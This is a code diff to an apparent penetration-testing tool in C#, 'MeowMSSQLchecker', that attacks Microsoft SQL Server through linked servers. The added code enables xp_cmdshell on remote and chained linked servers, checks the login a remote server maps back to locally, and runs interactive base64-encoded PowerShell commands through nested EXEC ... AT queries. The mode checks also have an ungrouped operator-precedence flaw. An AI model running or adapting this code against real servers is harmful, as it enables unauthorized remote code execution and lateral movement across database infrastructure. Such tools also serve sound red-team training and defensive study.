@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Text;
 using System.Net;
 using System.Data.SqlClient;
 using System.Collections.Generic;
@@ -20,11 +21,14 @@ namespace MeowMSSQLchecker
                 Console.WriteLine("    5  TARGET_HOST  USER    Try to Impersonate User.");
                 Console.WriteLine("    6  TARGET_HOST          Enumeration All Linked SQL Server.");
                 Console.WriteLine("    7  TARGET_HOST  SERVER  Remote Code Execution at Linked Server.");
+                Console.WriteLine("    8  TARGET_HOST  SERVER  Check Remote to Local Permission");
+                Console.WriteLine("    9  TARGET_HOST  SERVER  Command Execute from Remote Server");
                 return;
             }
 
             int mode = Convert.ToInt32(args[0]);
             string LHOST = "";
+            string CMD = "";
             string USER = "";
             string SERVER = "";
             string sqlServer = args[1];
@@ -48,20 +52,23 @@ namespace MeowMSSQLchecker
                 USER = args[2];
             }
 
-            if (mode == 7 & args.Length == 2)
+            if (mode == 7 | mode == 8 | mode == 9 & args.Length == 2)
             {
                 Console.WriteLine("[!] Missing params : SERVER");
                 return;
             }
-            else if (mode == 7 & args.Length == 3)
+            else if (mode == 7 | mode == 8 | mode == 9 & args.Length == 3)
             {
                 SERVER = args[2];
             }
+
+            Console.WriteLine(SERVER);
 
             string database = "master";
             string conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True";
             SqlConnection con = new SqlConnection(conString);
 
+            Console.WriteLine("[+] Try to connect to MSSQL Server");
             try
             {
                 con.Open();
@@ -143,22 +150,45 @@ namespace MeowMSSQLchecker
                     SQL_query("EXEC sp_linkedservers;", 6, con);
                     break;
                 case 7:
-                    string CMD = "";
                     Console.WriteLine("[+] Module : Remote Code Execution at Linked Server");
                     Console.WriteLine("[+] Enable xp_cmdshell");
                     SQL_query("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + SERVER, 2, con);
                     SQL_query("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + SERVER, 2, con);
                     while (true)
                     {
-                        Console.WriteLine("[!] WARNING : ONLY USE BASE64 ENCODE PAYLOAD");
-                        Console.Write("[?] Base64 Powershell : ");
+                        Console.Write("[?] Powershell Command : ");
                         CMD = Console.ReadLine();
                         if (CMD == "exit")
                         {
                             break;
                         }
+                        CMD = Convert.ToBase64String(Encoding.Unicode.GetBytes(CMD));
                         Console.WriteLine("[+] Command Result :");
                         SQL_query("EXEC ('xp_cmdshell ''powershell -enc " + CMD + "''') AT " + SERVER, 5, con);
+                    }
+                    break;
+                case 8:
+                    Console.WriteLine("[+] Module : Check Remote to Local Permission");
+                    Console.Write("[+] " + SERVER + " to " + sqlServer + " Permission is : ");
+                    SQL_query("select mylogin from openquery(\"" + SERVER + "\", 'select mylogin from openquery(\"" + sqlServer + "\", ''select SYSTEM_USER as mylogin'')')", 7, con);
+                    Console.WriteLine();
+                    break;
+                case 9:
+                    Console.WriteLine("[+] Module : Command Execute from Remote Server");
+                    Console.WriteLine("[+] Enable xp_cmdshell");
+                    SQL_query("EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT " + sqlServer + "') AT " + SERVER, 2, con);
+                    SQL_query("EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT " + sqlServer + "') AT " + SERVER, 2, con);
+                    while (true)
+                    {
+                        Console.Write("[?] Powershell Command : ");
+                        CMD = Console.ReadLine();
+                        if (CMD == "exit")
+                        {
+                            break;
+                        }
+                        CMD = Convert.ToBase64String(Encoding.Unicode.GetBytes(CMD));
+                        Console.WriteLine("[+] Command Result :");
+                        SQL_query("EXEC ('EXEC (''xp_cmdshell ''''powershell -enc " + CMD + "'''''') AT " + sqlServer + "') AT " + SERVER, 5, con);
                     }
                     break;
             }
